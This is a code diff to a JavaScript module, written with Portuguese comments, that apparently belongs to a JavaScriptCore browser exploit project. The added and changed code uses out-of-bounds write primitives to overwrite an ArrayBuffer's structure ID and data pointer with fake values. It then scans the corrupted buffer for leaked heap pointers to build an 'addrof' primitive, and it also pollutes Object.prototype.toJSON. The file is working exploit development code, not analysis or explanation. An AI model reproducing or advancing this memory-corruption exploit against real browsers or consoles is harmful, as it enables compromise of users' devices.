@@ -1,4 +1,4 @@
-// js/script3/testArrayBufferVictimCrash.mjs (v74.1 - Correção de Debug)
+// js/script3/testArrayBufferVictimCrash.mjs (v74.2 - Correção de Template String)
 
 import { logS3, PAUSE_S3 } from './s3_utils.mjs';
 import { AdvancedInt64, toHex } from '../utils.mjs';
@@ -10,7 +10,7 @@ import {
 } from '../core_exploit.mjs';
 import { JSC_OFFSETS } from '../config.mjs';
 
-export const FNAME_MODULE_TYPEDARRAY_ADDROF_V74_ACECABM = "OriginalHeisenbug_TypedArrayAddrof_v74_AnalyzeCoreExploitConfusedABMemory"; // Mantendo o nome da v74
+export const FNAME_MODULE_TYPEDARRAY_ADDROF_V74_ACECABM = "OriginalHeisenbug_TypedArrayAddrof_v74_AnalyzeCoreExploitConfusedABMemory";
 
 let probe_call_count_v74 = 0;
 let all_probe_interaction_details_v74 = [];
@@ -26,7 +26,7 @@ function toJSON_TA_Probe_Placeholder_v74() {
     const this_obj_type = Object.prototype.toString.call(this);
     let current_call_details = {
         call_number: call_num,
-        probe_variant: FNAME_MODULE_TYPEDARRAY_ADDROF_V74_ACECABM, // Usar o nome da v74
+        probe_variant: FNAME_MODULE_TYPEDARRAY_ADDROF_V74_ACECABM,
         this_type: this_obj_type,
         info: "Placeholder probe call for dummy stringify"
     };
@@ -46,12 +46,11 @@ export async function executeTypedArrayVictimAddrofTest_AnalyzeCoreExploitConfus
     let collected_probe_details_for_return = [];
 
     let errorCapturedMain = null;
-    let addrof_A_result = { success: false, msg: "Addrof CorruptedAB: Default (v74.1)" };
+    let addrof_A_result = { success: false, msg: "Addrof CorruptedAB: Default (v74.2)" };
 
     const OFFSET_STRUCTURE_ID = JSC_OFFSETS.JSCell.STRUCTURE_POINTER_OFFSET;
     const OFFSET_BUTTERFLY_DATA_FIELD = JSC_OFFSETS.ArrayBuffer.CONTENTS_IMPL_POINTER_OFFSET;
 
-    // Logs de depuração para as strings de configuração
     const FAKE_STRUCTURE_ID_VAL_STR = JSC_OFFSETS.Structure?.GENERIC_OBJECT_FAKE_ID_VALUE_FOR_CONFUSION;
     const FAKE_BUTTERFLY_DATA_VAL_STR = JSC_OFFSETS.ArrayBuffer?.BUTTERFLY_OR_DATA_FAKE_VALUE_FOR_CONFUSION;
 
@@ -66,7 +65,7 @@ export async function executeTypedArrayVictimAddrofTest_AnalyzeCoreExploitConfus
         return {
             errorCapturedMain: new Error(errorMsg), stringifyResult: null, rawStringifyForAnalysis: null,
             all_probe_calls_for_analysis: [], total_probe_calls: 0,
-            addrof_A_result: addrof_A_result, addrof_B_result: {success:false, msg:"N/A for v74.1"}
+            addrof_A_result: addrof_A_result, addrof_B_result: {success:false, msg:"N/A for v74.2"}
         };
     }
 
@@ -85,7 +84,7 @@ export async function executeTypedArrayVictimAddrofTest_AnalyzeCoreExploitConfus
         return {
             errorCapturedMain: e_adv64, stringifyResult: null, rawStringifyForAnalysis: null,
             all_probe_calls_for_analysis: [], total_probe_calls: 0,
-            addrof_A_result: addrof_A_result, addrof_B_result: {success:false, msg:"N/A for v74.1"}
+            addrof_A_result: addrof_A_result, addrof_B_result: {success:false, msg:"N/A for v74.2"}
         };
     }
 
@@ -106,7 +105,6 @@ export async function executeTypedArrayVictimAddrofTest_AnalyzeCoreExploitConfus
              addrof_A_result.msg = "V74 FALHA CRÍTICA: Endereço da JSCell do AB alvo não obtido/simulado.";
              logS3(addrof_A_result.msg, "error", FNAME_CURRENT_TEST);
         } else {
-            // ... (lógica de corrupção e leitura como na v74 original) ...
             logS3(`  Corrompendo metadados do target_ab_to_corrupt em ${toHex(address_of_target_ab_cell, 64)}...`, "info", FNAME_CURRENT_TEST);
             oob_write_absolute(address_of_target_ab_cell + OFFSET_STRUCTURE_ID, fake_struct_id_adv64.low(), 4);
             oob_write_absolute(address_of_target_ab_cell + OFFSET_STRUCTURE_ID + 4, fake_struct_id_adv64.high(), 4);
@@ -114,17 +112,46 @@ export async function executeTypedArrayVictimAddrofTest_AnalyzeCoreExploitConfus
             oob_write_absolute(address_of_target_ab_cell + OFFSET_BUTTERFLY_DATA_FIELD, fake_butterfly_adv64.low(), 4);
             oob_write_absolute(address_of_target_ab_cell + OFFSET_BUTTERFLY_DATA_FIELD + 4, fake_butterfly_adv64.high(), 4);
             logS3(`    Escrito fake Butterfly/Data ${fake_butterfly_adv64.toString(true)} em +${toHex(OFFSET_BUTTERFLY_DATA_FIELD)}`, "info", FNAME_CURRENT_TEST);
+
             await PAUSE_S3(100);
+
             logS3(`  Lendo campos do target_ab_to_corrupt (via DataView no seu buffer) APÓS corrupção...`, "info", FNAME_CURRENT_TEST);
             let fuzzed_reads = [];
             for (const offset of FUZZ_OFFSETS_V74) {
                 let low=0, high=0, ptr_str="N/A", dbl=NaN, err_msg=null;
                 if (dv_on_target_ab.byteLength < (offset + 8)) { err_msg = "OOB"; fuzzed_reads.push({ offset: toHex(offset), error: err_msg }); }
                 else { low=dv_on_target_ab.getUint32(offset,true); high=dv_on_target_ab.getUint32(offset+4,true); ptr_str=new AdvancedInt64(low,high).toString(true); let tb=new ArrayBuffer(8);(new Uint32Array(tb))[0]=low;(new Uint32Array(tb))[1]=high; dbl=(new Float64Array(tb))[0]; fuzzed_reads.push({offset:toHex(offset),low:toHex(low),high:toHex(high),int64:ptr_str,dbl:dbl,error:err_msg}); }
-                logS3(`    CorruptedAB Fuzz @${toHex(offset)}: L=${toHex(low)} H=${toHex(high)} I64=${ptr_str} D=${dbl}${err_msg?' E:'+err_msg:''}`, "dev_verbose");
+                
+                // CORREÇÃO AQUI: Template string simplificada
+                let logMsg = `    CorruptedAB Fuzz @${toHex(offset)}: L=${toHex(low)} H=${toHex(high)} I64=${ptr_str} D=${dbl}`;
+                if (err_msg) logMsg += ` E:${err_msg}`;
+                logS3(logMsg, "dev_verbose");
             }
-            for (const r of fuzzed_reads) { /* ... (lógica de análise de fuzzed_reads) ... */ }
-            // ... (resto da lógica de análise e definição de addrof_A_result.msg)
+
+            for (const r of fuzzed_reads) {
+                if (r.error) continue;
+                if (r.offset === toHex(OFFSET_STRUCTURE_ID) && r.int64 === fake_struct_id_adv64.toString(true)) {
+                    logS3(`  !!!! V74 VERIFICADO: Fake StructureID ${r.int64} lido de volta do offset ${r.offset} !!!!`, "vuln");
+                    if (!addrof_A_result.msg.includes("VERIFICADO")) addrof_A_result.msg = "";
+                    addrof_A_result.msg += `V74 Fake StructureID verificado em ${r.offset}. `;
+                }
+                if (r.offset === toHex(OFFSET_BUTTERFLY_DATA_FIELD) && r.int64 === fake_butterfly_adv64.toString(true)) {
+                    logS3(`  !!!! V74 VERIFICADO: Fake Butterfly/Data ${r.int64} lido de volta do offset ${r.offset} !!!!`, "vuln");
+                    if (!addrof_A_result.msg.includes("VERIFICADO")) addrof_A_result.msg = "";
+                    addrof_A_result.msg += `Fake Butterfly/Data verificado em ${r.offset}. `;
+                }
+                const hV=parseInt(r.high,16),lV=parseInt(r.low,16); let isPotentialPtr=false;
+                if(JSC_OFFSETS.JSValue?.HEAP_POINTER_TAG_HIGH!==undefined && JSC_OFFSETS.JSValue?.TAG_MASK!==undefined && JSC_OFFSETS.JSValue?.CELL_TAG!==undefined){isPotentialPtr=(hV===JSC_OFFSETS.JSValue.HEAP_POINTER_TAG_HIGH&&(lV&JSC_OFFSETS.JSValue.TAG_MASK)===JSC_OFFSETS.JSValue.CELL_TAG);}if(!isPotentialPtr&&(hV>0||lV>0x10000)&&(hV<0x000F0000)&&((lV&0x7)===0)){isPotentialPtr=true;}
+
+                if(isPotentialPtr && !(hV === 0 && lV === 0) && r.int64 !== fake_struct_id_adv64.toString(true) && r.int64 !== fake_butterfly_adv64.toString(true) ){
+                    addrof_A_result.success = true;
+                    addrof_A_result.msg = `V74 SUCCESS (CorruptedAB Read): Potential Ptr ${r.int64} from offset ${r.offset}`;
+                    logS3(`  !!!! V74 POTENTIAL POINTER FOUND in CorruptedAB at offset ${r.offset}: ${r.int64} !!!!`, "vuln");
+                    break;
+                }
+            }
+            if(!addrof_A_result.success && !addrof_A_result.msg.includes("verificado")){ addrof_A_result.msg = `V74 Reads from CorruptedAB did not yield pointer. First read @0x00: ${fuzzed_reads[0]?.int64 || 'N/A'}`; }
+            else if (!addrof_A_result.success && addrof_A_result.msg.includes("verificado")) { addrof_A_result.msg += "Nenhum outro ponteiro encontrado.";}
         }
 
         let dummy_victim = new Uint8Array(new ArrayBuffer(16));
@@ -136,9 +163,10 @@ export async function executeTypedArrayVictimAddrofTest_AnalyzeCoreExploitConfus
         JSON.stringify(dummy_victim);
         logS3(`  JSON.stringify on dummy victim completed.`, "info", FNAME_CURRENT_TEST);
 
+
         if (addrof_A_result.success) { document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V74_ACECABM}: Addr SUCCESS!`; }
         else if (addrof_A_result.msg.includes("verificado")) { document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V74_ACECABM}: Corruption OK, Addr Fail`; }
-        else if (addrof_A_result.msg.includes("FALHA CRÍTICA") || addrof_A_result.msg.includes("Config ERR")) { document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V74_ACECABM}: Critical Fail`;}
+        else if (addrof_A_result.msg.includes("FALHA CRÍTICA") || addrof_A_result.msg.includes("Config ERR") || addrof_A_result.msg.includes("HexParse ERR")) { document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V74_ACECABM}: Critical Fail`;}
         else { document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V74_ACECABM}: Addr Fail`; }
 
     } catch (e_overall_main) {
@@ -154,7 +182,7 @@ export async function executeTypedArrayVictimAddrofTest_AnalyzeCoreExploitConfus
         clearOOBEnvironment({force_clear_even_if_not_setup: true});
         if (pollutionApplied) {
             if (originalToJSONDescriptor) Object.defineProperty(Object.prototype, 'toJSON', originalToJSONDescriptor);
-            else delete Object.prototype.toJSON;
+            else delete Object.prototype.toJSON; // Garante que será removido se original era null
             logS3(`  Object.prototype.toJSON restored after dummy stringify.`, "info", FNAME_CURRENT_TEST);
         }
         logS3(`--- ${FNAME_CURRENT_TEST} Completed ---`, "test", FNAME_CURRENT_TEST);
@@ -166,6 +194,6 @@ export async function executeTypedArrayVictimAddrofTest_AnalyzeCoreExploitConfus
         all_probe_calls_for_analysis: collected_probe_details_for_return,
         total_probe_calls: probe_call_count_v74,
         addrof_A_result: addrof_A_result,
-        addrof_B_result: {success:false, msg:"N/A for v74.1"}
+        addrof_B_result: {success:false, msg:"N/A for v74.2"}
     };
 };
